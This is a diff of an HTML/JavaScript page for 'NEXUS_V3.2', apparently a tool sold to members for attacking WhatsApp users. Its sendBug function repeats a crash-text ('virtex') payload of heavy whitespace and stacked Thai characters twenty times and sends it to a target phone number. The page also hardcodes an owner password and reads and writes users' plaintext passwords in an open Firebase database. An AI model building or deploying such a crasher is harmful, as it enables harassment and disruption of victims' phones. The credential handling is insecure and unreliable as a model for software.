@@ -17,13 +17,165 @@
         .progress-fill { width: 0%; height: 100%; background: var(--neon); box-shadow: 0 0 10px var(--neon); transition: 0.1s; }
 
         /* UI CORE */
-        .bg-animate { position: fixed; top:0; left:0; width:100%; height:100%; z-index:-1; background: radial-gradient(circle at 50% 50%, #1a0510, #050103); }
         .card { background: var(--glass); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 20px var(--glow); backdrop-filter: blur(10px); }
         input, select { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.5); border: 1px solid var(--neon); border-radius: 8px; color: #00ffcc; outline: none; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, var(--neon), #80002b); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: 0.3s; }
-        .btn-main:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--neon); }
-        
-        /* NAV & LIST */
-        header { padding: 15px; background: rgba(0,0,0,0.8); border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; }
-        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--neon); z-index: 100; }
+        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, var(--neon), #80002b); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--neon); }
         .nav-item { color: #555; font-size: 0.7rem; cursor: pointer; text-align: center; }
+        .active { color: var(--neon); font-weight: bold; }
+        .user-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #333; font-size: 0.8rem; }
+        .badge { font-size: 0.6rem; padding: 2px 5px; border-radius: 4px; font-weight: bold; margin-left: 5px; }
+        .HIGH-OWNER { background: #00ffff; color: #000; }
+        .OWNER { background: #ff00ff; color: #fff; }
+        .MEMBER { background: #00ff00; color: #000; }
+        .hidden { display: none !important; }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div id="loader">
+        <div class="scanline"></div>
+        <div class="load-text" id="load-info">INITIALIZING...</div>
+        <div class="progress-bar"><div class="progress-fill" id="p-fill"></div></div>
+        <p style="font-size: 0.6rem; color: #555; margin-top: 15px;">BY: hanzX</p>
+    </div>
+
+    <audio id="nexus-bgm" loop>
+        <source src="https://files.catbox.moe/k3v8z0.mp3" type="audio/mpeg">
+    </audio>
+
+    <div id="login-screen" style="height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;" class="hidden">
+        <h1 style="color: var(--neon); text-shadow: 0 0 25px var(--neon);">NEXUS_V3.2</h1>
+        <div class="card" style="width: 85%;">
+            <input type="text" id="u" placeholder="USERNAME">
+            <input type="password" id="p" placeholder="PASSWORD">
+            <button class="btn-main" onclick="handleLogin()">AUTHENTICATE</button>
+            <p id="msg" style="color: yellow; text-align: center; font-size: 0.8rem; margin-top: 10px;"></p>
+        </div>
+    </div>
+
+    <div id="app" class="hidden">
+        <header style="padding: 15px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between;">
+            <span style="color: var(--neon); font-weight: bold;">NEXUS SYSTEM v3.2</span>
+            <span style="color:#00ff00; font-size: 0.7rem;">ONLINE</span>
+        </header>
+
+        <div id="p-home" class="page">
+            <div class="card">
+                <h3>VIRTEX TERMINAL</h3>
+                <input type="number" id="target" placeholder="TARGET (628xxx)">
+                <select id="bug-type">
+                    <option value="fx4">FX4CRASHER (VIRTEX X20)</option>
+                    <option value="ui">CRASH UI SYSTEM</option>
+                </select>
+                <button class="btn-main" onclick="sendBug()">➤ DEPLOY ATTACK</button>
+            </div>
+            <div class="card" style="font-size: 0.7rem;">
+                <p>User: <b id="disp-u"></b> (<span id="disp-r"></span>)</p>
+            </div>
+        </div>
+
+        <div id="p-admin" class="page hidden">
+            <div class="card">
+                <h3>CREATE ACCOUNT</h3>
+                <input type="text" id="nu" placeholder="New Username">
+                <input type="password" id="np" placeholder="New Password">
+                <select id="nr"></select>
+                <input type="number" id="nd" placeholder="Days" value="7">
+                <button class="btn-main" onclick="createUser()">DEPLOY</button>
+            </div>
+            <div class="card" id="user-list">Fetching...</div>
+        </div>
+
+        <nav class="nav-bottom">
+            <div class="nav-item active" onclick="tab('home')">HOME</div>
+            <div id="nav-adm" class="nav-item hidden" onclick="tab('admin')">ADMIN</div>
+        </nav>
+    </div>
+
+    <script>
+        const BASE_URL = "https://nexuscrasher-default-rtdb.asia-southeast1.firebasedatabase.app/users";
+        let myRole = "";
+
+        window.addEventListener('load', () => {
+            let prog = 0;
+            const fill = document.getElementById('p-fill');
+            const interval = setInterval(() => {
+                prog += 5;
+                if (prog >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('login-screen').classList.remove('hidden');
+                }
+                fill.style.width = prog + '%';
+            }, 100);
+        });
+
+        async function handleLogin() {
+            document.getElementById('nexus-bgm').play().catch(() => {});
+            const u = document.getElementById('u').value.trim();
+            const p = document.getElementById('p').value.trim();
+            if (u === "hanzX" && p === "rehanganteng") { loginSuccess(u, "HIGH-OWNER", "PERMANENT"); return; }
+            const res = await fetch(`${BASE_URL}/${u}.json`);
+            const data = await res.json();
+            if (data && data.p === p) loginSuccess(u, data.r, "ACTIVE");
+            else document.getElementById('msg').innerText = "WRONG CREDENTIALS!";
+        }
+
+        function loginSuccess(u, r, e) {
+            myRole = r;
+            document.getElementById('login-screen').classList.add('hidden');
+            document.getElementById('app').classList.remove('hidden');
+            document.getElementById('disp-u').innerText = u;
+            document.getElementById('disp-r').innerText = r;
+            if (r.includes("OWNER")) document.getElementById('nav-adm').classList.remove('hidden');
+            
+            const roleSelect = document.getElementById('nr');
+            if (r === "HIGH-OWNER") {
+                roleSelect.innerHTML = `<option value="MEMBER">MEMBER</option><option value="OWNER">OWNER</option><option value="HIGH-OWNER">HIGH-OWNER</option>`;
+            } else {
+                roleSelect.innerHTML = `<option value="MEMBER">MEMBER</option>`;
+            }
+            renderList();
+        }
+
+        async function renderList() {
+            const listDiv = document.getElementById('user-list');
+            const res = await fetch(`${BASE_URL}.json`);
+            const data = await res.json();
+            let html = "<h4>USER LIST</h4>";
+            for (let key in data) {
+                html += `<div class="user-item"><span>${key} <span class="badge ${data[key].r}">${data[key].r}</span></span></div>`;
+            }
+            listDiv.innerHTML = html;
+        }
+
+        async function createUser() {
+            const u = document.getElementById('nu').value.trim();
+            const p = document.getElementById('np').value.trim();
+            const r = document.getElementById('nr').value;
+            const d = document.getElementById('nd').value;
+            const expTime = new Date().getTime() + (d * 24 * 60 * 60 * 1000);
+            await fetch(`${BASE_URL}/${u}.json`, { method: 'PUT', body: JSON.stringify({ p, r, exp: expTime }) });
+            alert("SUCCESS!"); renderList();
+        }
+
+        function tab(n) {
+            document.querySelectorAll('.page').forEach(x => x.classList.add('hidden'));
+            document.getElementById('p-' + n).classList.remove('hidden');
+        }
+
+        function sendBug() {
+            const t = document.getElementById('target').value;
+            if(!t) return alert("Target?");
+            
+            // ISI VIRTEX_WA.TXT ASLI (DIGANDAIN 20x)
+            const rawVirtex = `Sorry kalo ngelag^_^                                                                                                                                                                                               ผิดุท้่เึางืผิดุท้่เึางื *@+62 999-9999-9999*`;
+            const payload = (rawVirtex + "\n").repeat(20);
+            
+            window.location.href = `https://api.whatsapp.com/send?phone=${t}&text=${encodeURIComponent(payload)}`;
+        }
+    </script>
+</body>
+</html>
